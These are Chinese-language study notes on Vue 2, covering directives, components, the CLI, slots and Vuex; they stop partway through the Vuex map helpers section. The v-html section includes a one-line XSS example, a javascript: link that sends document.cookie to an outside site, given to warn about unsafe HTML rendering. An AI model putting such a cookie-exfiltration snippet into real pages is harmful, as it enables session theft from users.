# Vue

- Vue (读音 /vjuː/，类似于 view) **是一套用于构建用户界面的渐进式框架**。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。

## Vue 核心

### Vue 简介

- 借鉴 Angular 的模板和数据绑定
- 借鉴 React 的组件化和虚拟 DOM 技术
  ![alt](./images/1.png)
  ![alt](./images/2.png)

### Vue 特点

1. 遵循 MVVM 模式
2. 编码简洁, 体积小, 运行效率高, 适合移动/PC 端开
3. 它本身只关注 UI, 也可以引入其它第三方库开发
   ![alt](./images/3.png)
   ![alt](./images/4.png)
   ![alt](./images/5.png)
   ![alt](./images/6.png)
   ![alt](./images/7.png)

### 模板语法

- html 中包含了一些 JS 语法代码，语法分为两种，分别为：
  - 插值语法（双大括号表达式）
  - 指令（以 v-开头

#### 插值语法

- 功能: 用于解析标签体内容
- 语法: {{xxx}} ，xxxx 会作为 js 表达式解析

![alt](./images/24.png)

#### 指令语法

- 功能: 解析标签属性、解析标签体内容、绑定事件
- 举例：`v-bind:href = 'xxxx'` ，xxxx 会作为 js 表达式被解析
- 说明：Vue 中有有很多的指令，此处只是用 v-bind 举个例子

### 数据绑定

- 单向数据绑定
  - 语法：`v-bind:href ="xxx"` 或简写为 `:href`
  - 特点：数据只能从 data 流向页面

<br>

- 双向数据绑定
  - 语法：`v-mode:value="xxx"` 或简写为 `v-model="xxx"`
  - 特点：数据不仅能从 data 流向页面，还能从页面流向 data

### Vue 数据代理

1. Vue 中的数据代理:
   - 通过 vm 对象来代理 data 对象中属性的操作(读/写)
2. Vue 中数据代理的好处:
   - 更加方便的操作 data 中的数据
3. 基本原理
   - 通过 `object.defineProperty()`把 data 对象中所有属性添加到 vm 上.
   - 为每一个添加到 vm 上的属性,都指定一个 getter/setter。
   - 在 getter/setter 内部去操作(读/写)data 中对应的属性。

```javascript
let obj1 = { x: 100 };
let obj2 = { y: 100 };
Object.defineProperty(obj2, "x", {
  get() {
    // 读取时
    return obj.x;
  },
  set(value) {
    // 修改时
    obj.x = value;
  },
});
```

![alt](./images/9.png)

### MVVM 模型

- 设计模式:设计模式是对代码分层, 引入一种架构的概念
- MVVM 好处:减少 DOM 操作, 提高开发效率

1. M：模型(Model) ：对应 data 中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel) ： Vue 实例对象
   ![alt](./images/8.png)

### 事件处理

#### 绑定监听

1. 使用`v-on:xxx`或` @xxx` 绑定事件,其中 xxx 是事件名;
2. 事件的回调需要配置在 methods 对象中，最终会在 vm 上;
3. methods 中配置的函数，不要用箭头函数!否则 this 就不是 vm 了;
4. methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或组件实例对象;
5. `@click="demo” `和 `@click="demo($event)” `效果一致，但后者可以传参;

#### 事件修饰符

1. `prevent: `阻止默认事件（常用）;
2. `stop: `阻止事件冒泡（常用）;
3. `once: `事件只触发一次（常用）;
4. `capture:` 使用事件的捕获模式;
5. `self:` 只有 event.target 是当前操作的元素时才触发事件:
6. `passive: `事件的默认行为立即执行,无需等待事件回调执行完毕;

#### 按键修饰符

1. Vue 中常用的按键别名:
   - 回车 => `enter`
   - 删除 => `delete `(捕获“删除”和“退格”键)
   - 退出 => `esc`
   - 空格 => `space`
   - 换行 => `tab `(特殊,必须配合 keydown 去使用)
   - 上 => `up`
   - 下 => `down`
   - 左 => `left`
   - 右 => `right`
2. Vue 未提供别名的按健，可以使用按健原始的 key 值去绑定，但注意要转为 kebab-case(短横线命名）
3. 系统修饰键（用法特殊）:ctrl、alt、shift、meta
   (1).配合 keyup 使用:按下修饰健的同时，再按下其他键，随后释放其他健，事件才被触发。
   (2).配合 keydown 使用:正常触发事件。
4. 也可以使用 keyCode 去指定具体的按键（不推荐)
5. Vue.config. keyCodes.自定义键名=键码,可以去定制按键别名

### 计算属性-computed

> 要显示的数据不存在，要通过计算得来。
> 在 computed 对象中定义计算属性。
> 在页面中使用{{方法名}}来显示计算的结果。

1. 定义:要用的属性不存在,要通过已有属性计算得来。
2. 原理:底层借助了 `objcet.defineproperty `方法提供的 getter 和 setter。
3. get 函数什么时候执行?
   - 初次读取时会执行一次。T
   - 当依赖的数据发生改变时会被再次调用。
4. 优势:与 methods 实现相比，内部有缓存机制（复用），效率更高，调试方便。
5. 备注:
   - 计算属性最终会出现在 vm 上，直接读取使用即可。
   - 如果计算属性要被修改，那必须写 set 函数去响应修改，且 set 中要引起计算时依赖的数据发

### 监视属性-watch

1. 当被监视的属性变化时,回调函数自动调用,进行相关操作
2. 监视的属性必须存在,才能进行监视!!
3. 监视的两种写法:
   - (1).new Vue 时传入 watch 配置
   - (2).通过 vm.$watch 监视

- 深度监视:
  - (1).Vue 中的 watch 默认不监测对象内部值的改变(一层)。
  - (2).配置 deep:true 可以监测对象内部值改变(多层）。
- 备注:
  - (1).Vue 自身可以监测对象内部值的改变，但 Vue 提供的 watch 默认不可以!
  - (2).使用 watch 时根据数据的具体结构，决定是否采用深度监视。

![alt](./images/27.png)
![alt](./images/28.png)

### computed 和 watch 的区别

1. computed 能完成的功能,watch 都可以完成。
2. watch 能完成的功能，computed 不一定能完成，例如: watch 可以进行异步操作。

- 两个重题的小原则:
  - 所被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或组件实例对象。
  - 所有不被 Vue 所管理的函数（定时器的回调函数、ajax 的回调函数等)，最好写成箭头函数，这样 this 的指向才是 vm 或组件实例对象。

### class 与 style 绑定

- 在应用界面中, 某个(些)元素的样式是变化的
- class/style 绑定就是专门用来实现动态样式效果的技术

1. class 样式
   - 写法`:class="xxx"` xxx 可以是字符串、对象、数组。
     - 字符串写法适用于:类名不确定,要动态获取。
     - 对象写法适用于:要绑定多个样式,个数不确定,名字也不确定。
     - 数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。
2. style 样式
   - `:style="{fontsize: xxx}"` 其中 xxx 是动态值。
   - `:style="[a,b]"` 其中 a、b 是样式对象。

### 条件渲染

1. v-if
   - 写法:
     - (1)`.v-if="表达式"`
     - (2)`.v-else-if="表达式"`
     - (3)`.v-else="表达式"`
   - 适用于: 切换频率较低的场景。
   - 特点: 不展示的 DOM 元素直接被移除。
   - 注意: `v-if` 可以和 `:v-else-if`、`v-else `一起使用，但要求结构不能被“打断”。
2. v-show
   - 写法: v-show="表达式"
   - 适用于: 切换频率较高的场景。
   - 特点: 不展示的 DOM 元素未被移除，仅仅是使用样式隐藏掉
3. 备注:
   - 使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到。

### 列表渲染

- v-for 指令:
  - 用于展示列表数据
  - 语法: `v-for="(item,index) in xxx" ` `:key="yyy"`
  - 可遍历:数组、对象、字符串(用的很少)、指定次数(用的很少)

### key 的作用

> 面试题:react、 vue 中的 key 有什么作用? (key 的内部原理)

1. 虚拟 DOM 中 key 的作用:
   - key 是虚拟 DOM 对象的标识，当数据发生变化时，Vue 会根据【新数据】生成【新的虚拟 DOM】
   - 随后 Vue 进行【新虚拟 DOM】与【旧虚拟 DOM】的差异比较，比较规则如下:
2. 对比规则:
   - 旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key:
     - 若虚拟 DOM 中内容没变,直接使用之前的真实 DOM !
     - 若虚拟 DOM 中内容变了，则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM.
   - 旧虚拟 DOM 中未找到与新虚拟 DOM 相同的 key
     - 创建新的真实 DOM，随后渲染到到页面。
3. 用 index 作为 key 可能会引发的问题:
   - 若对数据进行:逆序添加、逆序删除等破坏顺序操作:
     - 会产生没有必要的真实 DOM 更新==>界面效果没问题,但效率低。
   - 如果结构中还包含输入类的 DOM:
     - 会产生错误 DOM 更新 ==> 界面有问题。
4. 开发中如何选择 key?:

   - 最好使用每条数据的唯一标识作为 key，比如 id、手机号、身份证号、学号等唯一值。
   - 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用 index 作为 key 是没有问题的。

![alt](./images/10.png)
![alt](./images/11.png)

### Vue 监视数据原理：

1. vue 会监视 data 中所有层次的数据。
2. 如何监测对象中的数据?
   - 通过 setter 实现监视,且要在 new Vue 时就传入要监测的数据。
     - 对象中后追加的属性，Vue 默认不做响应式处理
     - 如需给后添加的属性做响应式，请使用如下 API:
       - ` Vue.set(target.propertyName/index,value)`或
       - ` vm.$set(target.propertyName/index,value)`
3. 如何监测数组中的数据?
   - 通过包裹数组更新元素的方法实现,本质就是做了两件事:
     - 调用原生对应的方法对数组进行更新。
     - 重新解析模板，进而更新页面。
4. 在 Vue 修改数组中的某个元素一定要用如下方法:
   - 使用这些 API:`push()、pop()、shift()、unshift()、splice()、sort()、reverse()`
   - `vue.set()`或 `vm.$set()`
5. 特别注意:`Vue.set()` 和 `vm.$set() `不能给 vm 或 vm 的根数据对象添加属性!!!

### 收集表单数据

- 若:`<input type="text" />`，则 v-model 收集的是 value 值，用户输入的就是 value 值。
- 若:`<input type="radio" />`，则 v-model 收集的是 value 值，且要给标签配置 value 值。
- 若: `<input type="checkbox" / >`
  - 没有配置 input 的 value 属性，那么收集的就是 checked(勾选 or 未勾选，是布尔值)
  - 配置 input 的 value 属性:
    - v-model 的初始值是非数组，那么收集的就是 checked(勾选 or 未勾选，是布尔值)
    - v-model 的初始值是数组，那么收集的的就是 value 组成的数组
- 备注:v-model 的三个修饰符:
  - `lazy`: 失去焦点再收集数据
  - `number`: 输入字符串转为有效的数字
  - `trim`: 输入首尾空格过滤

### 过滤器

- 定义:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）.
- 语法:
  - 1.注册过滤器:`Vue.filter(name,callback)`或`new Vue{filters:{}}`
  - 2.使用过滤器: `{{ xxx │ 过滤器名 }}` 或 ` v-bind:属性="xxx │ 过滤器名"`
- 备注:
  - 1.过滤器也可以接收额外参数、多个过滤器也可以串联
  - 2.并没有改变原本的数据,是产生新的对应的数据
    ![alt](./images/25.png)
    ![alt](./images/26.png)

### 内置指令

- `v-bind:`单向绑定解析表达式,可简写为`:xxx`
- `v-model: `双向数据绑定
- `v-for:`遍历数组/对象/字符串
- `v-on:` 绑定事件监听，可简写为`@`
- `v-if: `条件渲染(动态控制节点是否存存在)
- `v-else:`条件渲染(动态控制节点是否存存在)
- `v-show:`条件渲染(动态控制节点是否展示)
- `v-text` 指令:
  - 作用:向其所在的节点中渲染文本内容。
  - 与插值语法的区别: `v-text` 会替换掉节点中的内容，{{xx}}则不会。
- `v-html` 指令:
  - 作用:向指定节点中渲染包含 html 结构的内容。
  - 与插值语法的区别:
    - `v-html` 会替换掉节点中所有的内容，`{{xx}}`则不会。
    - `v-html `可以识别 html 结构。 3.
  - 严重注意: `v-html` 有安全性问题!!!! - 在网站上动态渲染任意 HTML 是非常危险的,容易导致 XSS 攻击。 - 一定要在可信的内容上使用 `v-html`，永不要用在用户提交的内容上!
- `v-cloak` 指令（没有值）:

  - 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性。
  - 使用:

  ```html
  <style>
    [v-cloak] {
      display: none;
    }
  </style>
  ```

  - 配合 `v-cloak `可以解决网速慢时页面展示出{{xxx}}的问题。

- `v-once`指令:

  - `v-once`所在节点在初次动态渲染后，就视为静态内容了。
  - 以后数据的改变不会引起`v-once`所在结构的更新，可以用于优化性能。

- `v-pre`指令:

  - 跳过其所在节点的编译过程。
  - 可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。

  #### v-html cookie 安全问题

  `<a href=javascript:location.href="http://www.baidu.com?" +dotument.cookie>点击偷走cookie</a> `
  ![alt](./images/13.png)

### 自定义指令

- 定义语法：
  - 局部指令：
  ```js
  new Vue({                               new Vue({
     direcatives:{指令名:配置对象}   或者       direcatives{指令名:回调函数}
   })                                     })
  ```
- 配置对象中常用的 3 个回调:
  - `bind:` 指令与元素成功绑定时调用.
  - `inserted:` 指令所在元素被插入页面时调用.
  - `update:` 指令所在模板结构被重新解析时调用.
- 备注：
  - 指令定义时不加 `v-`，但使用时要加 `v-`;
  - 指令名如果是多个单词，要使用`kebab-case`命名方式，不要用`camelCase`命名。

### Vue 生命周期

- 又名: 生命周期回调函数、生命周期函数、生命周期钩子。
- 是什么: Vue 在关键时刻帮我们调用的一些特殊名称的函数。
- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
- 生命周期函数中的 this 指向是 vm 或组件实例对象。

- 常用的生命周期钩子:
  - `mounted:`发送 ajax 请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
  - `beforeDestroy:`清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
- 关于销毁 Vue 实例
  - 销毁后借助 Vue 开发者工具看不到任何信息。
  - 销毁后自定义事件会失效,但原生 DOM 事件依然有效。
  - 一般不会在 `beforeDestroy` 操作数据，因为即便操作数据，也不会再触发更新流程了。

![alt](./images/生命周期.png)

## Vue 组件化编程

### 模块与组件、模块化与组件化

- 模块
  - 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件
  - 为什么: js 文件很多很复杂
  - 作用: 复用 js, 简化 js 的编写, 提高 js 运行效
- 模块化
  - 当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。
- 组件
  - 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)
  - 为什么: 一个界面的功能很复杂
  - 作用: 复用编码, 简化项目编码, 提高运行效率
- 组件化
  - 当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用。

![alt](./images/14.png)
![alt](./images/16.png)
![alt](./images/15.png)

### 非单文件组件

- Vue 中使用组件的三大步骤
  - 定义组件（创建组件）
  - 注册组件
  - 使用组件（写组件标签）
- 如何定义一个组件？
  - 使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的那个 `options` 几乎一样,但也有点区别：
  - 区别如下：
    - `el`不要写，为什么?————最终所有的组件都要经过一个 vm 的管理，由 vm 中的 el 决定服务哪个容器.
    - `data`必须写成函数，为什么?————避免组件被复用时,数据存在引用关系。
  - 备注:使用 template 可以配置组件结构。
- 如何注册组件?
  - 局部注册:靠 `new Vue `的时候传入 `components` 选项
  - 全局注册:靠 `Vue.component('组件名’,组件)`
- 三、编写组件标签:
  - `<school></school>`
- 几个注意点:
  - 关于组件名:
    - 一个单词组成:
      - 第一种写法(首字母小写):`school`
      - 第二种写法(首字母大写):`School`
    - 多个单词组成:
      - 第一种写法(kebab-case 命名):`my-school`
      - 第二种写法(CamelCase 命名):`MySchool`（需要 Vue 脚手架支持)
    - 备注:
      - 组件名尽可能回避 HTML 中已有的元素名称，例如: h2、H2 都不行。
      - 可以使用 name 配置项指定组件在开发者工具中呈现的名字-
  - 关于组件标签:
    - 第一种写法:`<school></school>`
    - 第二种写法: `<school/>`
    - 备注:不用使用脚手架时，`<school/>`会导致后续组件不能渲染。
  - 一个简写方式:
    - `const school = Vue.extend(options)`可简写为: `const school = options`

### VueComponent

- school 组件本质是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的。
- 我们只需要写`<school/>`或`<school></school>`，Vue 解析时会帮我们创建 school 组件的实例对象，即 vue 帮我们执行的: `new VueComponent(options)`。
- 特别注意:每次调用 `Vue.extend`，返回的都是一个全新的 `VueComponent`!!!!
- 关于 `this` 指向:
  - 组件配置中:
    - data 函数、methods 中的函数、watch 中的函数、computed 中的函数它们的 this 均是【VueComponent 实例对象】.
  - `new Vue(options)`配置中:
    - data 函数、methods 中的函数、watch 中的函数、computed 中的函数它们的 this 均是【Vue 实例对象】。
- `VueComponent` 的实例对象，以后简称 vc（也可称之为:组件实例对象）。
  - Vue 的实例对象，以后简称 vm.

<br>

- 一个重要的内置关系:`VueComponent.prototype._proto_ == Vue.prototype`
- 为什么要有这个关系:让组件实例对象（vc）可以访问到 Vue 原型上的属性、方法。
  ![alt](./images/17.png)

### 单文件组件

- 一个`.vue`文件的组成(三个部分)

  ```vue
  <template>页面模板</template>
  
  <script>
  // 引入组件
  import *** from './***.vue'
  import *** from './***.vue'
  export default {
    JS 模块对象
  }
  </script>
  
  <style>
  样式定义
  </style>
  ```

## Vue 脚手架

- Vue 脚手架也叫 Vue CLI ，CLI 全名为 command line interface
- Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。
- 文档: https://cli.vuejs.org/zh/。

### Vue 脚手架使用步骤

- 第一步（仅第一次执行）：全局安装@vue/cli。
  `npm install -g @vue/cli`
- 第二步：切换到你要创建项目的目录，然后使用命令创建项目
  `vue create xxxx`
- 第三步：启动项目
  `npm run serve`
- 备注：
  - 如出现下载缓慢请配置 npm 淘宝镜像：`npm config set registry` https://registry.npm.taobao.org
  - Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpack 配置，请执行：`vue inspect > output.js`

### 脚手架文件结构

- 项目目录

```bash
 vuecil-demo        # 项目目录
    ├── node_modules # 项目依赖的第三方包
    ├── public       # 静态文件目录
      ├── favicon.ico# 浏览器小图标
      └── index.html # 单页面的html文件(网页浏览的是它)
    ├── src          # 业务文件夹
      ├── assets     # 静态资源
        └── logo.png # vue的logo图片
      ├── components # 组件目录
        └── HelloWorld.vue # 欢迎页面vue代码文件
      ├── App.vue    # 整个应用的根组件
      └── main.js    # 入口js文件
    ├── .gitignore   # git提交忽略配置
    ├── babel.config.js  # babel配置
    ├── package.json  # 依赖包列表
    ├── README.md    # 项目说明
	└── yarn.lock    # 项目包版本锁定和缓存地址
```

<br>

- **关于不同版本的 Vue:**
  - `vue.js `与 `vue.runtime.xxx.js` 的区别:
    - `vue.js `是完整版的 Vue,包含:核心功能+模板解析器。
    - `vue.runtime.xxx.js` 是运行版的 Vue，只包含:核心功能;没有模板解析器。
  - 因为 `vue.runtime.xxx.js` 没有模板解析器，所以不能使用 template 配置项，需要使用 render 函数接收到的 `createElement` 函数去指定具体内容。

<br>

- `vue.config.js`**配置文件**
  - 使用`vue inspect > output.js`可以查看到 Vue 脚手架的默认配置。
  - 使用`vue.config.js`可以对脚手架进行个性化定制，详情见: https://cli.vuejs.org/zh

### ref 属性

- 被用来给元素或子组件注册引用信息(id 的替代者)
- 应用在 htm1 标签上获取的是真实 DOM 元素，应用在组件标签上是组件实例对象(vc)
- 使用方式:
  - 打标识:`<h1 ref="xxx">....</h1>`或`<School ref="xxx"></School>`
  - 获取: `this.$refs.xxx`

### props 配置项

- 功能:让组件接收外部传过来的数据
  - 传递数据:
    - `<Demo name="xxx"/>`
  - 接收数据:
    - 第一种方式（只接收）:
      - `props: ["name"]`
    - 第二种方式(限制类型):
      - ```vue
        props:{ name:String }
        ```
    - 第三种方式(限制类型、限制必要性、指定默认值):
      - ```vue
        props:{ name:{ type:String， //类型 required:true， /必要性
        default:'老王' //默认值 } }
        ```
- 备注: props 是只读的，Vue 底层会监测你对 props 的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制 props 的内容到 data 中一份，然后去修改 data 中的数据。

### mixin 混合/混入

- 功能:可以把多个组件共用的配置提取成一个混入对象
- 使用方式:
  - 第一步定义混合，例如:
    - ```vue
      { 
        data(){
          ...
        },
        methods:{
          ....
        }, 
        .... 
      }
      ```
  - 第二步使用混入，例如:
    - 全局混入: `Vue.mixin(xxx)`
    - 局部混入: `mixins:['xxx']`

### Vue 插件

- 功能:用于增强 Vue
- 本质:包含 install 方法的一个对象，install 的第一个参数是 Vue，第二个以后的参数是插件使用者传递的数据。
- 定义插件:

  - ```js
    对象.install = function (Vue,options) {
      // 1．添加全局过滤器
      Vue.filter(....)
    
      // 2. 添加全局指令
      vue.directive(....)
    
      // 3．配置全局混入(合)
      Vue.mixin(....)
    
      // 4. 添加实例方法
      Vue.prototype.$myMethod = function () {..}
      vue.prototype.$myProperty = xxxx
    }
    ```

- 使用插件: `Vue.use()`

### scoped 样式

- 作用:让样式在局部生效。防止冲突.
- 写法: `<style scoped>`

### Todolist 案例

- 组件化编码流程:
  - 拆分静态组件:组件要按照功能点拆分，命名不要与 html 元素冲突。
  - 实现动态组件:考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用:
    - 一个组件在用:放在组件自身即可。
    - 一些组件在用:放在他们共同的父组件上(状态提升)。
  - 实现交互:从绑定事件开始。
- `props` 适用于:
  - 父组件==>子组件通信
  - 子组件==>父组件通信(要求父先给子一个函数)
- 使用 `v-model` 时要切记: `v-model` 绑定的值不能是 `props` 传过来的值，因为 `props` 是不可以修改的!
- `props` 传过来的若是对象类型的值，修改对象中的属性时 Vue 不会报错，但不推荐这样做。

### 组件的自定义事件

- 一种组件间通信的方式，适用于:子组件===>父组件
- 使用场景:A 是父组件，B 是子组件，B 想给 A 传数据，那么就要在 A 中给 B 绑定自定义事件(事件的回调在 A 中)。
- 绑定自定义事件:
  - 第一种方式，在父组件中: `<Demo @zidingyi="test"/>` 或 `<Demo v-on:zidingyi="test"/>`
  - 第二种方式，在父组件中:
    ```vue
    <Demo ref="demo" / > ...... mounted(){
    this.$refs.xxx.$on('zidingyi',this.test) }
    ```
  - 若想让自定义事件只能触发一次，可以使用 `once` 修饰符，或 `$once` 方法。
- 触发自定义事件: `this.$emit('zidingyi',数据)`
- 解绑自定义事件: `this.$off("zidingyi")`
- 组件上也可以绑定原生 DOM 事件，需要使用 `native` 修饰符。
- 注意:通过 `this.$refs.x.$on('zidingyi',回调)` 绑定自定义事件时，回调要么配置在 methods 中，要么用箭头函数，否则 this 指向会出问题!

### 全局事件总线 (GlobalEventBus)

- 一种组件间通信的方式，适用于任意组件间通信。
- 安装全局事件总线:
  ```vue
  new vue({ 
    ...... 
    beforeCreate() { 
      Vue.prototype.$bus = this
      //安装全局事件总线，$bus 就是当前应用的 vm 
    }, 
    ......
  })
  ```
- 使用事件总线:
  - 接收数据:A 组件想接收数据，则在 A 组件中给 `$bus` 绑定自定义事件，事件的回调留在 A 组件自身。
    ```vue
    methods(){ 
      demo(data){......} 
    } 
    mounted() { 
      this.$bus.$on('xxxx',this.demo)
    }
    ```
  - 提供数据: `this.$bus.$emit('xxxx',数据)`
- 最好在 `beforeDestroy `钩子中，用 `$off` 去解绑当前组件所用到的事件。

### 消息订阅与发布 (pubsub)

- 一种组件间通信的方式，适用于任意组件间通信。
- 使用步骤:
  - 安装 pubsub: `npm i pubsub-js`
  - 引入: `import pubsub from 'pubsub-js'`
  - 接收数据:A 组件想接收数据，则在 A 组件中订阅消息，订阅的回调留在 A 组件自身。
    ```vue
    methods(){ 
      demo(data){......} 
    } 
    ...... 
    mounted() { 
      this.pid =pubsub.subscribe("xxx",this.demo) //订阅消息. 
    }
    ```
  - 提供数据: `pubsub.publish('xxx",数据)`
  - 最好在 beforeDestroy 钩子中，用 `PubSub .unsubscribe(pid) `去 `<span style="color : red"">取消订阅。</span>`

### nextTick

- 语法: `this.$nextTick(回调函数)`
- 作用:在下一次 DOM 更新结束后执行其指定的回调。
- 什么时候用:当改变数据后，要基于更新后的新 DOM 进行某些操作时，要在 nextTick 所指定的回调函数中执行。

### Vue 封装的过度与动画

1. 作用：在插入、更新或移除 DOM 元素时，在合适的时候给元素添加样式类名。

2. 图示：
   ![alt](./images/18.png)

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用`<transition>`包裹要过度的元素，并配置 name 属性：

      ```vue
      <transition name="hello">
       <h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：`<transition-group>`，且每个元素都要指定`key`值。

## Vue 中的 Ajax

### vue 脚手架配置代理

- **方法一**

 在 vue.config.js 中添加如下配置：

```js
devServer: {
  proxy: "http://localhost:5000";
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

- **方法二**

 编写 vue.config.js 配置具体代理规则：

```js
module.exports = {
  devServer: {
    proxy: {
      "/api1": {
        // 匹配所有以 '/api1'开头的请求路径
        target: "http://localhost:5000", // 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: { "^/api1": "" },
      },
      "/api2": {
        // 匹配所有以 '/api2'开头的请求路径
        target: "http://localhost:5001", // 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: { "^/api2": "" },
      },
    },
  },
};
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

### 插槽

1. 作用：让父组件可以向子组件指定位置插入 html 结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
      <Category>
        <div>html结构1</div>
      </Category>
      子组件中：
      <template>
        <div>
          <!-- 定义插槽 -->
          <slot>插槽默认内容...</slot>
        </div>
      </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
      <Category>
        <template slot="center">
          <div>html结构1</div>
        </template>
        <template v-slot:footer>
           <div>html结构2</div>
        </template>
      </Category>
      子组件中：
      <template>
        <div>
          <!-- 定义插槽 -->
          <slot name="center">插槽默认内容...</slot>
          <slot name="footer">插槽默认内容...</slot>
        </div>
      </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games 数据在 Category 组件中，但使用数据所遍历出来的结构由 App 组件决定）

      2. 具体编码：

        ```vue
        父组件中：
        <Category>
          <template scope="scopeData">
            <!-- 生成的是ul列表 -->
            <ul>
              <li v-for="g in scopeData.games" :key="g">{{g}}</li>
            </ul>
          </template>
        </Category>
      
        <Category>
          <template slot-scope="scopeData">
            <!-- 生成的是h4标题 -->
            <h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
          </template>
        </Category>
        子组件中：
        <template>
          <div>
            <slot :games="games"></slot>
          </div>
        </template>
      
        <script>
          export default {
            name: "Category",
            props: ["title"],
            //数据在子组件自身
            data() {
              return {
                games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
              };
            },
          }
        </script>
        ``

   ```
   
   ```

## Vuex

- 概念
  ​- 在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。
- 何时使用?
  - 多个组件需要共享数据时

![alt](./images/19.png)
![alt](./images/20.png)
![alt](./images/vuex.png)

### 搭建 Vuex 环境

1. 创建文件：`src/store/index.js`

   ```js
   //引入Vue核心库
   import Vue from "vue";
   //引入Vuex
   import Vuex from "vuex";
   //应用Vuex插件
   Vue.use(Vuex);

   //准备actions对象——响应组件中用户的动作
   const actions = {};
   //准备mutations对象——修改state中的数据
   const mutations = {};
   //准备state对象——保存具体的数据
   const state = {};

   //创建并暴露store
   export default new Vuex.Store({
     actions,
     mutations,
     state,
   });
   ```

2. 在`main.js`中创建 vm 时传入`store`配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
    el:'#app',
    render: h => h(App),
    store
   })
   ```

### Vuex 基本使用

1. 初始化数据、配置`actions`、配置`mutations`，操作文件`store.js`

   ```js
   //引入Vue核心库
   import Vue from "vue";
   //引入Vuex
   import Vuex from "vuex";
   //引用Vuex
   Vue.use(Vuex);

   const actions = {
     //响应组件中加的动作
     jia(context, value) {
       // console.log('actions中的jia被调用了',miniStore,value)
       context.commit("JIA", value);
     },
   };

   const mutations = {
     //执行加
     JIA(state, value) {
       // console.log('mutations中的JIA被调用了',state,value)
       state.sum += value;
     },
   };

   //初始化数据
   const state = {
     sum: 0,
   };

   //创建并暴露store
   export default new Vuex.Store({
     actions,
     mutations,
     state,
   });
   ```

2. 组件中读取 vuex 中的数据：`$store.state.sum`

3. 组件中修改 vuex 中的数据：`$store.dispatch('action中的方法名',数据)` 或 `$store.commit('mutations中的方法名',数据)`

   > 备注：若没有网络请求或其他业务逻辑，组件中也可以越过 actions，即不写`dispatch`，直接编写`commit`

### getters 的使用

1. 概念：当 state 中的数据需要经过加工后再使用时，可以使用 getters 加工。

2. 在`store.js`中追加`getters`配置

   ```js
   ......

   const getters = {
    bigSum(state){
     return state.sum * 10
    }
   }

   //创建并暴露store
   export default new Vuex.Store({
    ......
    getters
   })
   ```

3. 组件中读取数据：`$store.getters.bigSum`

### map 方法的使用

1. <strong>mapState 方法：</strong>用于帮助我们映射`state`中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),

       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters 方法：</strong>用于帮助我们映射`getters`中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),

       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions 方法：</strong>用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
